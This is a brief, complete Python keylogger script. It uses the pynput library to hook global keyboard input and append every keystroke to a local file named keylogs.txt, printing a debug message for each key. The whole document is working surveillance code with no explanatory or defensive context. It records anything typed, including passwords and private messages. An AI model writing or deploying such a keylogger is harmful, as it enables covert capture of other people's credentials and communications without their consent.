from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(str(key))
            print(f'Key {key} pressed and logged') # Debug print statement
    except Exception as e:
        print(f'Error occurred: {e}') # Debug print statement

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()